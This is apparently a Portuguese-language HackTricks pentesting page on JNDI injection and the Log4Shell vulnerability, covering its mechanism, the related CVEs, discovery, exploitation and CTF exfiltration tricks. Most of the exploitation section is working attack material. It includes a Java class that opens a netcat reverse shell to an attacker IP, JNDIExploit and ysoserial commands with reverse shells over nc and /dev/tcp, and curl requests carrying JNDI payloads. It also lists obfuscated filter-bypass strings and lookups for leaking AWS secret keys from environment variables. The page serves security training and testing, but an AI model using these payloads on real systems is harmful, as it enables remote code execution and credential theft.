# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

JNDI, integrado ao Java desde o final da d√©cada de 1990, serve como um servi√ßo de diret√≥rio, permitindo que programas Java localizem dados ou objetos por meio de um sistema de nomenclatura. Ele suporta v√°rios servi√ßos de diret√≥rio por meio de interfaces de provedor de servi√ßo (SPIs), permitindo a recupera√ß√£o de dados de diferentes sistemas, incluindo objetos Java remotos. Os SPIs comuns incluem CORBA COS, Java RMI Registry e LDAP.

### Refer√™ncia de Nomenclatura JNDI

Objetos Java podem ser armazenados e recuperados usando Refer√™ncias de Nomenclatura JNDI, que v√™m em duas formas:

* **Endere√ßos de Refer√™ncia**: Especifica a localiza√ß√£o de um objeto (por exemplo, _rmi://server/ref_), permitindo a recupera√ß√£o direta do endere√ßo especificado.
* **F√°brica Remota**: Faz refer√™ncia a uma classe de f√°brica remota. Quando acessada, a classe √© baixada e instanciada do local remoto.

No entanto, esse mecanismo pode ser explorado, levando potencialmente ao carregamento e execu√ß√£o de c√≥digo arbitr√°rio. Como contramedida:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` por padr√£o a partir do JDK 7u21, restringindo o carregamento de objetos remotos. Um Gerenciador de Seguran√ßa limita ainda mais o que pode ser carregado.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` por padr√£o a partir do JDK 6u141, 7u131, 8u121, bloqueando a execu√ß√£o de objetos Java carregados remotamente. Se definido como `true`, a execu√ß√£o de c√≥digo remoto √© poss√≠vel sem a supervis√£o de um Gerenciador de Seguran√ßa.
* **CORBA**: N√£o possui uma propriedade espec√≠fica, mas o Gerenciador de Seguran√ßa est√° sempre ativo.

No entanto, o **Gerenciador de Nomenclatura**, respons√°vel por resolver links JNDI, carece de mecanismos de seguran√ßa integrados, permitindo potencialmente a recupera√ß√£o de objetos de qualquer fonte. Isso representa um risco, pois as prote√ß√µes RMI, LDAP e CORBA podem ser contornadas, levando ao carregamento de objetos Java arbitr√°rios ou √† explora√ß√£o de componentes de aplicativo existentes (gadgets) para executar c√≥digo malicioso.

Exemplos de URLs explor√°veis incluem:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

Apesar das prote√ß√µes, vulnerabilidades permanecem, principalmente devido √† falta de salvaguardas contra o carregamento de JNDI de fontes n√£o confi√°veis e √† possibilidade de contornar as prote√ß√µes existentes.

### Exemplo JNDI

![](<../../.gitbook/assets/image (1022).png>)

Mesmo que voc√™ tenha definido um **`PROVIDER_URL`**, voc√™ pode indicar um diferente em uma busca e ele ser√° acessado: `ctx.lookup("<attacker-controlled-url>")` e √© isso que um atacante ir√° abusar para carregar objetos arbitr√°rios de um sistema controlado por ele.

### Vis√£o Geral do CORBA

CORBA (Common Object Request Broker Architecture) emprega uma **Refer√™ncia de Objeto Interoper√°vel (IOR)** para identificar de forma √∫nica objetos remotos. Esta refer√™ncia inclui informa√ß√µes essenciais como:

* **ID do Tipo**: Identificador √∫nico para uma interface.
* **Codebase**: URL para obter a classe stub.

Notavelmente, o CORBA n√£o √© inerentemente vulner√°vel. Garantir seguran√ßa geralmente envolve:

* Instala√ß√£o de um **Gerenciador de Seguran√ßa**.
* Configura√ß√£o do Gerenciador de Seguran√ßa para permitir conex√µes a codebases potencialmente maliciosas. Isso pode ser alcan√ßado atrav√©s de:
* Permiss√£o de socket, por exemplo, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Permiss√µes de leitura de arquivo, seja universalmente (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ou para diret√≥rios espec√≠ficos onde arquivos maliciosos possam ser colocados.

No entanto, algumas pol√≠ticas de fornecedores podem ser lenientes e permitir essas conex√µes por padr√£o.

### Contexto RMI

Para RMI (Remote Method Invocation), a situa√ß√£o √© um pouco diferente. Assim como no CORBA, o download arbitr√°rio de classes √© restrito por padr√£o. Para explorar o RMI, normalmente seria necess√°rio contornar o Gerenciador de Seguran√ßa, um feito tamb√©m relevante no CORBA.

### LDAP

Primeiro de tudo, precisamos distinguir entre uma Busca e uma Consulta.\
Uma **busca** usar√° uma URL como `ldap://localhost:389/o=JNDITutorial` para encontrar o objeto JNDITutorial de um servidor LDAP e **recuperar seus atributos**.\
Uma **consulta** √© destinada a **servi√ßos de nomenclatura**, pois queremos obter **qualquer coisa vinculada a um nome**.

Se a busca LDAP foi invocada com **SearchControls.setReturningObjFlag() com `true`, ent√£o o objeto retornado ser√° reconstru√≠do**.

Portanto, existem v√°rias maneiras de atacar essas op√ß√µes.\
Um **atacante pode envenenar registros LDAP introduzindo payloads** neles que ser√£o executados nos sistemas que os coletam (muito √∫til para **comprometer dezenas de m√°quinas** se voc√™ tiver acesso ao servidor LDAP). Outra maneira de explorar isso seria realizar um **ataque MitM em uma busca LDAP**, por exemplo.

Caso voc√™ consiga **fazer um aplicativo resolver uma URL JNDI LDAP**, voc√™ pode controlar o LDAP que ser√° pesquisado e poderia enviar de volta o exploit (log4shell).

#### Exploit de Deserializa√ß√£o

![](<../../.gitbook/assets/image (275).png>)

O **exploit √© serializado** e ser√° desserializado.\
Caso `trustURLCodebase` seja `true`, um atacante pode fornecer suas pr√≥prias classes na codebase, caso contr√°rio, ele precisar√° abusar de gadgets no classpath.

#### Exploit de Refer√™ncia JNDI

√â mais f√°cil atacar este LDAP usando **refer√™ncias JavaFactory**:

![](<../../.gitbook/assets/image (1059).png>)

## Vulnerabilidade Log4Shell

A vulnerabilidade √© introduzida no Log4j porque suporta uma [**sintaxe especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) na forma `${prefix:name}` onde `prefix` √© um dos v√°rios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) onde `name` deve ser avaliado. Por exemplo, `${java:version}` √© a vers√£o atual do Java em execu√ß√£o.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) introduziu um recurso de Lookup `jndi`. Este recurso permite a recupera√ß√£o de vari√°veis atrav√©s do JNDI. Normalmente, a chave √© automaticamente prefixada com `java:comp/env/`. No entanto, se a chave em si incluir um **":"**, esse prefixo padr√£o n√£o √© aplicado.

Com um **: presente** na chave, como em `${jndi:ldap://example.com/a}`, n√£o h√° **prefixo** e o **servidor LDAP √© consultado para o objeto**. E esses Lookups podem ser usados tanto na configura√ß√£o do Log4j quanto quando as linhas s√£o registradas.

Portanto, a √∫nica coisa necess√°ria para obter RCE √© uma **vers√£o vulner√°vel do Log4j processando informa√ß√µes controladas pelo usu√°rio**. E porque esta √© uma biblioteca amplamente utilizada por aplica√ß√µes Java para registrar informa√ß√µes (incluindo aplica√ß√µes voltadas para a Internet), era muito comum ter log4j registrando, por exemplo, cabe√ßalhos HTTP recebidos como o User-Agent. No entanto, log4j **n√£o √© usado apenas para registrar informa√ß√µes HTTP, mas qualquer entrada** e dados que o desenvolvedor indicou.

## Vis√£o Geral dos CVEs Relacionados ao Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Cr√≠tico]**

Esta vulnerabilidade √© uma falha cr√≠tica de **deserializa√ß√£o n√£o confi√°vel** no componente `log4j-core`, afetando vers√µes de 2.0-beta9 a 2.14.1. Ela permite **execu√ß√£o remota de c√≥digo (RCE)**, permitindo que atacantes assumam o controle dos sistemas. O problema foi relatado por Chen Zhaojun da Alibaba Cloud Security Team e afeta v√°rios frameworks Apache. A corre√ß√£o inicial na vers√£o 2.15.0 foi incompleta. Regras Sigma para defesa est√£o dispon√≠veis ([Regra 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Regra 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Cr√≠tico]**

Inicialmente classificado como baixo, mas posteriormente elevado para cr√≠tico, este CVE √© uma falha de **Nega√ß√£o de Servi√ßo (DoS)** resultante de uma corre√ß√£o incompleta em 2.15.0 para CVE-2021-44228. Afeta configura√ß√µes n√£o padr√£o, permitindo que atacantes causem ataques DoS atrav√©s de payloads elaborados. Um [tweet](https://twitter.com/marcioalm/status/1471740771581652995) mostra um m√©todo de contorno. O problema foi resolvido nas vers√µes 2.16.0 e 2.12.2, removendo padr√µes de busca de mensagens e desabilitando JNDI por padr√£o.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**

Afetando **vers√µes Log4j 1.x** em configura√ß√µes n√£o padr√£o usando `JMSAppender`, este CVE √© uma falha de deserializa√ß√£o n√£o confi√°vel. Nenhuma corre√ß√£o est√° dispon√≠vel para a ramifica√ß√£o 1.x, que est√° no fim da vida, e recomenda-se a atualiza√ß√£o para `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]**

Esta vulnerabilidade afeta o **framework de logging Logback**, um sucessor do Log4j 1.x. Anteriormente considerado seguro, o framework foi encontrado vulner√°vel, e novas vers√µes (1.3.0-alpha11 e 1.2.9) foram lan√ßadas para resolver o problema.

### **CVE-2021-45105** **\[Alto]**

Log4j 2.16.0 cont√©m uma falha de DoS, levando ao lan√ßamento do `log4j 2.17.0` para corrigir o CVE. Mais detalhes est√£o no [relat√≥rio da BleepingComputer](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Afetando a vers√£o 2.17 do log4j, este CVE exige que o atacante controle o arquivo de configura√ß√£o do log4j. Envolve potencial execu√ß√£o de c√≥digo arbitr√°rio via um JDBCAppender configurado. Mais detalhes est√£o dispon√≠veis no [post do blog da Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Explora√ß√£o do Log4Shell

### Descoberta

Esta vulnerabilidade √© muito f√°cil de descobrir se desprotegida, pois enviar√° pelo menos uma **solicita√ß√£o DNS** para o endere√ßo que voc√™ indicar em seu payload. Portanto, payloads como:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (usando [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (usando [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (usando Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (usando [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` usando (usando [huntress](https://log4shell.huntress.com))

Note que **mesmo que uma solicita√ß√£o DNS seja recebida, isso n√£o significa que a aplica√ß√£o seja explor√°vel** (ou mesmo vulner√°vel), voc√™ precisar√° tentar explor√°-la.

{% hint style="info" %}
Lembre-se de que para **explorar a vers√£o 2.15** voc√™ precisa adicionar o **bypass de verifica√ß√£o de localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Descoberta Local**

Procure por **vers√µes vulner√°veis locais** da biblioteca com:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifica√ß√£o**

Algumas das plataformas listadas anteriormente permitir√£o que voc√™ insira alguns dados vari√°veis que ser√£o registrados quando solicitados.\
Isso pode ser muito √∫til para 2 coisas:

* Para **verificar** a vulnerabilidade
* Para **exfiltrar informa√ß√µes** abusando da vulnerabilidade

Por exemplo, voc√™ poderia solicitar algo como:\
ou como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** e se um **pedido DNS for recebido com o valor da vari√°vel de ambiente**, voc√™ sabe que a aplica√ß√£o √© vulner√°vel.

Outras informa√ß√µes que voc√™ poderia tentar **vazar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
Hosts executando vers√µes do JDK acima de 6u141, 7u131 ou 8u121 est√£o protegidos contra o vetor de ataque de carregamento de classe LDAP. Isso se deve √† desativa√ß√£o padr√£o de `com.sun.jndi.ldap.object.trustURLCodebase`, que impede o JNDI de carregar uma base de c√≥digo remota via LDAP. No entanto, √© crucial notar que essas vers√µes **n√£o est√£o protegidas contra o vetor de ataque de desserializa√ß√£o**.

Para atacantes que visam explorar essas vers√µes mais altas do JDK, √© necess√°rio aproveitar um **gadget confi√°vel** dentro da aplica√ß√£o Java. Ferramentas como ysoserial ou JNDIExploit s√£o frequentemente usadas para esse prop√≥sito. Por outro lado, explorar vers√µes mais baixas do JDK √© relativamente mais f√°cil, pois essas vers√µes podem ser manipuladas para carregar e executar classes arbitr√°rias.

Para **mais informa√ß√µes** (_como limita√ß√µes em vetores RMI e CORBA_) **verifique a se√ß√£o anterior de Refer√™ncia de Nomea√ß√£o JNDI** ou [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec com payload personalizado

Voc√™ pode testar isso na **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Use a ferramenta [**marshalsec**](https://github.com/mbechler/marshalsec) (vers√£o jar dispon√≠vel [**aqui**](https://github.com/RandomRobbieBF/marshalsec-jar)). Essa abordagem estabelece um servidor de refer√™ncia LDAP para redirecionar conex√µes para um servidor HTTP secund√°rio onde o exploit ser√° hospedado:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Para solicitar que o alvo carregue um c√≥digo de shell reverso, crie um arquivo Java chamado `Exploit.java` com o conte√∫do abaixo:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Compile o arquivo Java em um arquivo de classe usando: `javac Exploit.java -source 8 -target 8`. Em seguida, inicie um **servidor HTTP** no diret√≥rio contendo o arquivo de classe com: `python3 -m http.server`. Certifique-se de que o **servidor LDAP marshalsec** fa√ßa refer√™ncia a este servidor HTTP.

Acione a execu√ß√£o da classe de exploit no servidor web vulner√°vel enviando um payload semelhante a:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Nota:** Este exploit depende da configura√ß√£o do Java para permitir o carregamento de c√≥digo remoto via LDAP. Se isso n√£o for permitido, considere explorar uma classe confi√°vel para execu√ß√£o de c√≥digo arbitr√°rio.

### RCE - **JNDIExploit**

{% hint style="info" %}
Note que, por algum motivo, o autor removeu este projeto do github ap√≥s a descoberta do log4shell. Voc√™ pode encontrar uma vers√£o em cache em [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), mas se voc√™ quiser respeitar a decis√£o do autor, use um m√©todo diferente para explorar essa vulnerabilidade.

Al√©m disso, voc√™ n√£o pode encontrar o c√≥digo-fonte na wayback machine, ent√£o ou analise o c√≥digo-fonte ou execute o jar sabendo que voc√™ n√£o sabe o que est√° executando.
{% endhint %}

Para este exemplo, voc√™ pode apenas executar este **servidor web vulner√°vel ao log4shell** na porta 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_no README voc√™ encontrar√° como execut√°-lo_). Este aplicativo vulner√°vel est√° registrando com uma vers√£o vulner√°vel do log4shell o conte√∫do do cabe√ßalho da solicita√ß√£o HTTP _X-Api-Version_.

Em seguida, voc√™ pode baixar o arquivo jar **JNDIExploit** e execut√°-lo com:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Ap√≥s ler o c√≥digo por apenas alguns minutos, em _com.feihong.ldap.LdapServer_ e _com.feihong.ldap.HTTPServer_ voc√™ pode ver como os **servidores LDAP e HTTP s√£o criados**. O servidor LDAP entender√° qual payload precisa ser servido e redirecionar√° a v√≠tima para o servidor HTTP, que servir√° o exploit.\
Em _com.feihong.ldap.gadgets_ voc√™ pode encontrar **alguns gadgets espec√≠ficos** que podem ser usados para executar a a√ß√£o desejada (potencialmente executar c√≥digo arbitr√°rio). E em _com.feihong.ldap.template_ voc√™ pode ver as diferentes classes de template que **gerar√£o os exploits**.

Voc√™ pode ver todos os exploits dispon√≠veis com **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Alguns √∫teis s√£o:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Ent√£o, em nosso exemplo, j√° temos aquele aplicativo vulner√°vel em execu√ß√£o no docker. Para atac√°-lo:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Ao enviar os ataques, voc√™ ver√° algumas sa√≠das no terminal onde executou **JNDIExploit-1.2-SNAPSHOT.jar**.

**Lembre-se de verificar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para outras op√ß√µes de explora√ß√£o. Al√©m disso, caso precise, voc√™ pode alterar a porta dos servidores LDAP e HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De maneira semelhante ao exploit anterior, voc√™ pode tentar usar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explorar essa vulnerabilidade.\
Voc√™ pode gerar as URLs para enviar √† v√≠tima executando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque usando um objeto java gerado customizado funcionar√° em laborat√≥rios como o **THM solar room**. No entanto, isso geralmente n√£o funcionar√° (j√° que por padr√£o o Java n√£o est√° configurado para carregar c√≥digo remoto usando LDAP) eu acho que porque n√£o est√° abusando de uma classe confi√°vel para executar c√≥digo arbitr√°rio._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) √© outra ferramenta para gerar **links JNDI funcionais** e fornecer servi√ßos de fundo iniciando servidor RMI, servidor LDAP e servidor HTTP.\

### RCE - ysoserial & JNDI-Exploit-Kit

Esta op√ß√£o √© realmente √∫til para atacar **vers√µes do Java configuradas para confiar apenas em classes especificadas e n√£o em todas**. Portanto, **ysoserial** ser√° usado para gerar **serializa√ß√µes de classes confi√°veis** que podem ser usadas como gadgets para **executar c√≥digo arbitr√°rio** (_a classe confi√°vel abusada pelo ysoserial deve ser usada pelo programa java da v√≠tima para que a explora√ß√£o funcione_).

Usando **ysoserial** ou [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) voc√™ pode criar a explora√ß√£o de deserializa√ß√£o que ser√° baixada pelo JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Use [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para gerar **links JNDI** onde o exploit estar√° aguardando conex√µes das m√°quinas vulner√°veis. Voc√™ pode servir **diferentes exploits que podem ser gerados automaticamente** pelo JNDI-Exploit-Kit ou at√© mesmo seus **pr√≥prios payloads de desserializa√ß√£o** (gerados por voc√™ ou ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Agora voc√™ pode facilmente usar um link JNDI gerado para explorar a vulnerabilidade e obter um **reverse shell** apenas enviando para uma vers√£o vulner√°vel do log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Scanners Autom√°ticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encontre bibliotecas vulner√°veis locais

### Laborat√≥rios para testar

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Explora√ß√£o P√≥s-Log4Shell

Neste [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) est√° bem explicado como √© **potencialmente** **poss√≠vel** **abusar** de algumas funcionalidades do **Log4J**.

A [**p√°gina de seguran√ßa**](https://logging.apache.org/log4j/2.x/security.html) do Log4j tem algumas frases interessantes:

> A partir da vers√£o 2.16.0 (para Java 8), a **funcionalidade de busca de mensagens foi completamente removida**. **Buscas na configura√ß√£o ainda funcionam**. Al√©m disso, o Log4j agora desabilita o acesso ao JNDI por padr√£o. Buscas JNDI na configura√ß√£o agora precisam ser habilitadas explicitamente.

> A partir da vers√£o 2.17.0 (e 2.12.3 e 2.3.1 para Java 7 e Java 6), **apenas strings de busca na configura√ß√£o s√£o expandidas recursivamente**; em qualquer outro uso, apenas a busca de n√≠vel superior √© resolvida, e quaisquer buscas aninhadas n√£o s√£o resolvidas.

Isso significa que, por padr√£o, voc√™ pode **esquecer de usar qualquer exploit `jndi`**. Al√©m disso, para realizar **buscas recursivas**, voc√™ precisa t√™-las configuradas.

Por exemplo, neste CTF isso foi configurado no arquivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

No [este CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/), o atacante controlava o valor de `${sys:cmd}` e precisava exfiltrar a bandeira de uma vari√°vel de ambiente.\
Como visto nesta p√°gina em [**payloads anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), existem algumas maneiras de acessar vari√°veis de ambiente, como: **`${env:FLAG}`**. Neste CTF, isso foi in√∫til, mas pode n√£o ser em outros cen√°rios da vida real.

### Exfiltration in Exceptions

No CTF, voc√™ **n√£o conseguia acessar o stderr** da aplica√ß√£o java usando log4J, mas as **exce√ß√µes do Log4J s√£o enviadas para stdout**, que foram impressas no aplicativo python. Isso significava que, ao acionar uma exce√ß√£o, poder√≠amos acessar o conte√∫do. Uma exce√ß√£o para exfiltrar a bandeira foi: **`${java:${env:FLAG}}`**. Isso funciona porque **`${java:CTF{blahblah}}`** n√£o existe e uma exce√ß√£o com o valor da bandeira ser√° exibida:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

S√≥ para mencionar, voc√™ tamb√©m poderia injetar novos [**padr√µes de convers√£o**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) e acionar exce√ß√µes que ser√£o registradas em `stdout`. Por exemplo:

![](<../../.gitbook/assets/image (683).png>)

Isso n√£o foi considerado √∫til para exfiltrar dados dentro da mensagem de erro, porque a busca n√£o foi resolvida antes do padr√£o de convers√£o, mas poderia ser √∫til para outras coisas, como detec√ß√£o.

### Conversion Patterns Regexes

No entanto, √© poss√≠vel usar alguns **padr√µes de convers√£o que suportam regexes** para exfiltrar informa√ß√µes de uma busca usando regexes e abusando de **busca bin√°ria** ou comportamentos **baseados em tempo**.

* **Busca bin√°ria via mensagens de exce√ß√£o**

O padr√£o de convers√£o **`%replace`** pode ser usado para **substituir** **conte√∫do** de uma **string** mesmo usando **regexes**. Funciona assim: `replace{pattern}{regex}{substitution}`\
Abusando desse comportamento, voc√™ poderia fazer a substitui√ß√£o **acionar uma exce√ß√£o se a regex corresponder** a qualquer coisa dentro da string (e nenhuma exce√ß√£o se n√£o fosse encontrada) assim:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Baseado em tempo**

Como mencionado na se√ß√£o anterior, **`%replace`** suporta **regexes**. Portanto, √© poss√≠vel usar um payload da [**p√°gina ReDoS**](../regular-expression-denial-of-service-redos.md) para causar um **timeout** caso a flag seja encontrada.\
Por exemplo, um payload como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` acionaria um **timeout** naquele CTF.

